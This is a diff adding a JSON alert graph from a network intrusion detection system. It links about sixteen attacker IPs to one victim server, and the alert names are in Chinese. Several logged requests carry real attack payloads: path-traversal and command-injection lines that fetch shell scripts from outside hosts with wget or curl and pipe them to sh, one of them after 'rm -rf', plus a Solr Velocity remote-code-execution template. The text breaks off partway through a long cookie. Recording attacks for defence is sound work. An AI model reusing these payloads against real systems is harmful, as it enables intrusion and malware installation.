@@ -1,0 +1,1499 @@
+{
+  "tenant": "43881511",
+  "diffused_at": "2026-07-09T19:59:16.162246234+08:00",
+  "vertices": [
+    {
+      "id": "ip:118.196.56.74",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "118.196.56.74",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-21T14:53:45Z",
+        "last_seen_in_graph": "2026-06-21T14:53:45Z"
+      }
+    },
+    {
+      "id": "ip:121.194.14.146",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "121.194.14.146",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-21T23:19:30Z",
+        "last_seen_in_graph": "2026-06-21T23:19:30Z"
+      }
+    },
+    {
+      "id": "ip:121.194.14.147",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "121.194.14.147",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-22T02:45:16Z",
+        "last_seen_in_graph": "2026-06-22T02:45:16Z"
+      }
+    },
+    {
+      "id": "ip:121.248.57.234",
+      "type": "IP",
+      "role": "victim",
+      "is_anchor": true,
+      "asset_id": null,
+      "properties": {
+        "ip": "121.248.57.234",
+        "is_internal": false,
+        "in_degree": 16,
+        "first_seen_in_graph": "2026-06-20T18:40:52Z",
+        "last_seen_in_graph": "2026-06-22T05:05:11Z"
+      }
+    },
+    {
+      "id": "ip:141.105.36.57",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "141.105.36.57",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-20T22:08:44Z",
+        "last_seen_in_graph": "2026-06-20T22:08:44Z"
+      }
+    },
+    {
+      "id": "ip:143.244.144.237",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "143.244.144.237",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-21T05:35:06Z",
+        "last_seen_in_graph": "2026-06-21T05:35:06Z"
+      }
+    },
+    {
+      "id": "ip:165.245.200.192",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "165.245.200.192",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-21T16:34:05Z",
+        "last_seen_in_graph": "2026-06-21T16:34:05Z"
+      }
+    },
+    {
+      "id": "ip:167.71.55.243",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "167.71.55.243",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-21T01:07:15Z",
+        "last_seen_in_graph": "2026-06-21T01:07:15Z"
+      }
+    },
+    {
+      "id": "ip:172.232.232.10",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "172.232.232.10",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-20T18:40:52Z",
+        "last_seen_in_graph": "2026-06-20T18:41:16Z"
+      }
+    },
+    {
+      "id": "ip:175.43.91.118",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "175.43.91.118",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-21T15:03:12Z",
+        "last_seen_in_graph": "2026-06-21T15:03:12Z"
+      }
+    },
+    {
+      "id": "ip:178.105.251.55",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "178.105.251.55",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-21T15:11:55Z",
+        "last_seen_in_graph": "2026-06-21T15:11:55Z"
+      }
+    },
+    {
+      "id": "ip:182.190.217.8",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "182.190.217.8",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-21T21:04:28Z",
+        "last_seen_in_graph": "2026-06-21T21:04:28Z"
+      }
+    },
+    {
+      "id": "ip:185.91.69.33",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "185.91.69.33",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-22T05:05:11Z",
+        "last_seen_in_graph": "2026-06-22T05:05:11Z"
+      }
+    },
+    {
+      "id": "ip:195.170.172.225",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "195.170.172.225",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-22T03:05:33Z",
+        "last_seen_in_graph": "2026-06-22T03:05:43Z"
+      }
+    },
+    {
+      "id": "ip:196.151.224.25",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "196.151.224.25",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-22T02:34:18Z",
+        "last_seen_in_graph": "2026-06-22T02:34:18Z"
+      }
+    },
+    {
+      "id": "ip:45.148.10.200",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "45.148.10.200",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-21T19:37:40Z",
+        "last_seen_in_graph": "2026-06-22T01:35:03Z"
+      }
+    },
+    {
+      "id": "ip:80.87.206.229",
+      "type": "IP",
+      "role": "attacker",
+      "is_anchor": false,
+      "asset_id": null,
+      "properties": {
+        "ip": "80.87.206.229",
+        "is_internal": false,
+        "out_degree": 1,
+        "first_seen_in_graph": "2026-06-21T05:30:57Z",
+        "last_seen_in_graph": "2026-06-21T05:31:28Z"
+      }
+    }
+  ],
+  "main_edges": [
+    {
+      "src": "ip:118.196.56.74",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 1,
+      "first_seen": "2026-06-21T14:53:45Z",
+      "last_seen": "2026-06-21T14:53:45Z",
+      "occurrence_count": 1,
+      "occurrence_pattern": "one_shot",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782053625-hBgit",
+          "evidence_ids": [
+            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+            "libredtail-http"
+          ],
+          "ts": "2026-06-21T14:53:45Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "通用系统命令注入攻击,目录遍历攻击",
+            "protocol": "HTTP",
+            "src_port": 46286,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|代码注入|系统命令注入",
+            "threat_category": "exploit",
+            "request_headers": "POST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1\r\nHost: <OMITTED>\r\nUpgrade-Insecure-Requests: <OMITTED>\r\nAccept: <OMITTED>\r\nUser-Agent: libredtail-http\r\nConnection: <OMITTED>\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\n",
+            "request_body": "(wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s apache.selfrep"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:167.71.55.243",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 1,
+      "first_seen": "2026-06-21T01:07:15Z",
+      "last_seen": "2026-06-21T01:07:15Z",
+      "occurrence_count": 1,
+      "occurrence_pattern": "one_shot",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782004035-dWBe4",
+          "evidence_ids": [
+            "/solr/admin/cores?action=STATUS&wt=json",
+            "Go-http-client/1.1"
+          ],
+          "ts": "2026-06-21T01:07:15Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "ApacheSolr未授权访问漏洞",
+            "protocol": "HTTP",
+            "src_port": 52590,
+            "dst_port": 443,
+            "direction": "unknown",
+            "threat_type": "脆弱性风险|未授权访问|SOlr API未授权",
+            "threat_category": "unknown",
+            "request_headers": "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1\r\nHost: <OMITTED>\r\nUser-Agent: Go-http-client/1.1\r\nConnection: <OMITTED>\r\n",
+            "response_headers": "HTTP/1.1 400 Bad Request\r\nDate: Sun, 21 Jun 2026 01:07:15 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nServer: <OMITTED>\r\n",
+            "response_body": "<html>\r\n<head><title>400 The plain HTTP request was sent to HTTPS port</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<center>The plain HTTP request was sent to HTTPS port</center>\r\n</body>\r\n</html>\r\n"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:178.105.251.55",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 1,
+      "first_seen": "2026-06-21T15:11:55Z",
+      "last_seen": "2026-06-21T15:11:55Z",
+      "occurrence_count": 1,
+      "occurrence_pattern": "one_shot",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782054715-wYi1P",
+          "evidence_ids": [
+            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+            "libredtail-http"
+          ],
+          "ts": "2026-06-21T15:11:55Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "通用系统命令注入攻击,目录遍历攻击",
+            "protocol": "HTTP",
+            "src_port": 40932,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|代码注入|系统命令注入",
+            "threat_category": "exploit",
+            "request_headers": "POST /cgi-bin/../../../../../../../../../../bin/sh HTTP/1.1\r\nHost: <OMITTED>\r\nUpgrade-Insecure-Requests: <OMITTED>\r\nAccept: <OMITTED>\r\nUser-Agent: libredtail-http\r\nConnection: <OMITTED>\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\n",
+            "request_body": "(wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s apache.selfrep"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:196.151.224.25",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 1,
+      "first_seen": "2026-06-22T02:34:18Z",
+      "last_seen": "2026-06-22T02:34:18Z",
+      "occurrence_count": 1,
+      "occurrence_pattern": "one_shot",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782095658-IPynn",
+          "evidence_ids": [
+            "/api/solr/%7B%7Bcore%7D%7D/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+%5B1..$out.available()%5D)$str.valueOf($chr.toChars($out.read()))%23end",
+            "out.read",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
+          ],
+          "ts": "2026-06-22T02:34:18Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "fail",
+            "alert_name": "Apache Struts OGNL注入漏洞,PHP popen函数代码注入,Java代码注入攻击,Apache Velocity 代码注入漏洞,Jsp Webshell InputStream木马,Apache Solr Velocity远程代码执行漏洞(CVE-2019-17558),Apache Solr Select Api未授权命令执行漏洞(CNNVD-201912-1225)(CVE-2019-17558),Apache Solr未授权访问与远程命令执行漏洞(CVE-2019-0193)",
+            "protocol": "HTTP",
+            "src_port": 65100,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "漏洞攻击|Web框架漏洞|Web框架漏洞",
+            "threat_category": "exploit",
+            "request_headers": "GET /api/solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='')%20#set($rt=$x.class.forName('java.lang.Runtime'))%20#set($chr=$x.class.forName('java.lang.Character'))%20#set($str=$x.class.forName('java.lang.String'))%20#set($ex=$rt.getRuntime().exec('id'))%20$ex.waitFor()%20#set($out=$ex.getInputStream())%20#foreach($i%20in%20[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end HTTP/1.1\r\nHost: <OMITTED>\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\r\nAccept-Encoding: <OMITTED>\r\nConnection: <OMITTED>\r\nContent-Length: <OMITTED>\r\n",
+            "response_headers": "HTTP/1.1 404 Not Found\r\nServer: <OMITTED>\r\nDate: Fri, 19 Dec 2025 07:47:48 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\n",
+            "response_body": "\n\n<html>\n<head><title>404 Not Found</title></head><TRUNCATED>"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:141.105.36.57",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 1,
+      "first_seen": "2026-06-20T22:08:44Z",
+      "last_seen": "2026-06-20T22:08:44Z",
+      "occurrence_count": 1,
+      "occurrence_pattern": "one_shot",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1781993324-9Udy2",
+          "evidence_ids": [
+            "/shell?cd+/tmp;rm+-rf+*;wget+",
+            "Hello, world"
+          ],
+          "ts": "2026-06-20T22:08:44Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "通用系统命令注入攻击",
+            "protocol": "HTTP",
+            "src_port": 59643,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|代码注入|系统命令注入",
+            "threat_category": "exploit",
+            "request_headers": "GET /shell?cd+/tmp;rm+-rf+*;wget+ 157.90.250.90/jaws;sh+/tmp/jaws HTTP/1.1\r\nUser-Agent: Hello, world\r\nHost: <OMITTED>\r\nAccept: <OMITTED>\r\nConnection: <OMITTED>\r\n",
+            "response_headers": "HTTP/1.1 400 Bad Request\r\nDate: Sat, 20 Jun 2026 22:08:44 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nServer: <OMITTED>\r\n",
+            "response_body": "<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n</body>\r\n</html>\r\n"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:121.194.14.146",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 1,
+      "first_seen": "2026-06-21T23:19:30Z",
+      "last_seen": "2026-06-21T23:19:30Z",
+      "occurrence_count": 1,
+      "occurrence_pattern": "one_shot",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782083970-f34es",
+          "evidence_ids": [
+            "/153/list466.psp",
+            "seu.edu.cn",
+            "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
+          ],
+          "ts": "2026-06-21T23:19:30Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "爬虫BaiduSpider扫描",
+            "protocol": "HTTP",
+            "src_port": 5894,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "黑客工具|爬虫工具|爬虫工具",
+            "threat_category": "unknown",
+            "request_headers": "GET /153/list466.psp HTTP/1.1\r\nHost: <OMITTED>\r\nUser-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\r\nAccept-Language: <OMITTED>\r\nAccept: <OMITTED>\r\nAccept-Encoding: <OMITTED>\r\nCookie: bb17e08f-3bf7-493d-b96e-66d31e761fc5=f0b4178e65280c60416d8323dbc3c50a\r\nX-Forwarded-For: 220.181.108.145\r\n",
+            "response_headers": "HTTP/1.1 301 Moved Permanently\r\nDate: Sun, 21 Jun 2026 23:19:30 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nLocation: https://www.seu.edu.cn:443/153/list466.psp\r\nServer: <OMITTED>\r\n"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:175.43.91.118",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 1,
+      "raw_alert_count": 1,
+      "first_seen": "2026-06-21T15:03:12Z",
+      "last_seen": "2026-06-21T15:03:12Z",
+      "occurrence_count": 1,
+      "occurrence_pattern": "one_shot",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782054192-xcswp",
+          "evidence_ids": [
+            "/login.cgi?cli=aa%20aa%27;wget%20http://86.54.82.179/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$",
+            "Hakai/2.0"
+          ],
+          "ts": "2026-06-21T15:03:12Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "通用系统命令注入攻击",
+            "protocol": "HTTP",
+            "src_port": 57416,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "网站攻击|代码注入|系统命令注入",
+            "threat_category": "exploit",
+            "request_headers": "GET /login.cgi?cli=aa%20aa';wget%20http://86.54.82.179/sh%20-O%20->%20/tmp/kh;sh%20/tmp/kh'$ HTTP/1.1\r\nConnection: <OMITTED>\r\nAccept-Encoding: <OMITTED>\r\nAccept: <OMITTED>\r\nUser-Agent: Hakai/2.0\r\n",
+            "response_headers": "HTTP/1.1 400 Bad Request\r\nDate: Sun, 21 Jun 2026 15:03:11 GMT\r\nContent-Type: <OMITTED>\r\nContent-Length: <OMITTED>\r\nConnection: <OMITTED>\r\nServer: <OMITTED>\r\n",
+            "response_body": "<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n</body>\r\n</html>\r\n"
+          }
+        }
+      ]
+    },
+    {
+      "src": "ip:195.170.172.225",
+      "dst": "ip:121.248.57.234",
+      "edge_type": "TRIGGER",
+      "alert_count": 2,
+      "raw_alert_count": 3,
+      "first_seen": "2026-06-22T03:05:33Z",
+      "last_seen": "2026-06-22T03:05:43Z",
+      "occurrence_count": 3,
+      "occurrence_pattern": "burst",
+      "alert_edges": [
+        {
+          "alert_vid": "43881263|network_security_log-1782097533-3b1zt",
+          "evidence_ids": [
+            "/",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
+            "1HNLK6GFGBeCqnCrUY97rgmVbmiQxRX6kZ",
+            "0x6d5cc0183db850a099ec64e70ff4672035d0397a"
+          ],
+          "ts": "2026-06-22T03:05:33Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "fail",
+            "alert_name": "Web弱口令",
+            "protocol": "HTTP",
+            "src_port": 46180,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "脆弱性风险|弱口令|Web弱口令",
+            "threat_category": "abuse"
+          },
+          "count": 2,
+          "foldedStatement": "[2026-06-22T03:05:32Z~2026-06-22T03:05:33Z] 195.170.172.225 对 121.248.57.234:80 触发同类告警 94:4:7，聚合告警数：2，结果：failure",
+          "folded_alert_vids": [
+            "43881263|network_security_log-1782097532-3b1zy",
+            "43881263|network_security_log-1782097533-3b1zt"
+          ]
+        },
+        {
+          "alert_vid": "43881263|network_security_log-1782097543-TOXmW",
+          "evidence_ids": [
+            "/",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
+          ],
+          "ts": "2026-06-22T03:05:43Z",
+          "alert": {
+            "type": "SECURITY_LOG",
+            "attack_state": "attempt",
+            "alert_name": "缓冲区溢出检测",
+            "protocol": "HTTP",
+            "src_port": 50146,
+            "dst_port": 80,
+            "direction": "unknown",
+            "threat_type": "流量异常|HTTP流量异常|HTTP流量异常",
+            "threat_category": "abuse",
+            "request_headers": "GET / HTTP/1.1\r\nHost: <OMITTED>\r\nConnection: <OMITTED>\r\nCache-Control: <OMITTED>\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Language: <OMITTED>\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36\r\nCookie: K=Ktwv3mhFOuLf1ATW6KMr455q4S7YejtFGldJk8AAtvvJreX9V6l0Lpl78XBkEHVAXVzSkRxUm8bwvTDtkEwvTsQsJDseIZm0eR7MqQddpPQI2FIAUdLlbazTjYtMAouBrdpPWpRbdnfMV2drjGZqDkRoXNa3ojCQFwutLxtywzxfbnLWNl8Z8NiYTlvRuvMS8IR4Ef<TRUNCATED>\r\n[......]\r\n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